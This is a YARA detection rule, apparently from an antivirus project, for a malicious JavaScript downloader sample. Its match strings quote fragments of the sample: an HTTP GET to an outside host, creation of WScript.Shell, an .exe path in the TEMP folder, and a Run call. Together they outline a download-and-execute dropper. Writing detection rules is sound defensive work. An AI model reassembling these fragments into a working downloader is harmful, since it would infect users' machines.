rule sig_20160401_e98a7fec7e01d3ba842f94f64c67517c {
  meta:
    description = "datamaliciousorder - file 20160401_e98a7fec7e01d3ba842f94f64c67517c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "881f2da43de8a8f6503088b634870d688b0b0b3e70a871de6ed70357876935da"

  strings:
    $s1  = "VePgf[KvUt](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function BbxWf(NduVd, BaCi){YpKa = YpKa * 1; return NduVd - BaCi;};" fullword ascii
    $s3  = "var BhlCd = function QvKqm() {return WScript[TdzPq](\"WScript\"+\".Shell\");}(), CiHyr = 11;" fullword ascii
    $s4  = "if (VePgf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EfdMq() {return BhlCd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"wV84qHDRHy76ZLnk.ex\" + \"e\";};" fullword ascii
    $s6  = "function OuzZo(){return TfRf + \"\";};" fullword ascii
    $s7  = "function NaVax() {return ((OcoWw == true) && (OcoWw == IiNh)) ? 1 : YpKa;};" fullword ascii
    $s8  = "var OcoWw = false;" fullword ascii
    $s9  = "return BbxWf(WwgWl, BscCcy);" fullword ascii
    $s10 = "var CsaHpd = false;" fullword ascii
    $s11 = "var IiNh = false;" fullword ascii
    $s12 = "function YkWqn(CmMgt) {var QqRy = (1, 2, 3, 4, 5, CmMgt); return QqRy;};" fullword ascii
    $s13 = "var UwTzq = new this[\"Date\"]();" fullword ascii
    $s14 = "function IoOya()" fullword ascii
    $s15 = "function RtDwi(SyCyf){BhlCd[\"R\"+\"un\"](SyCyf, YpKa, YpKa);};" fullword ascii
    $s16 = "function UxQc(){return TdzPq;};" fullword ascii
    $s17 = "}while (PtuFh);" fullword ascii
    $s18 = "function CjqVhs(){return 23;};" fullword ascii
    $s19 = "IiNh = true; " fullword ascii
    $s20 = "OcoWw = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}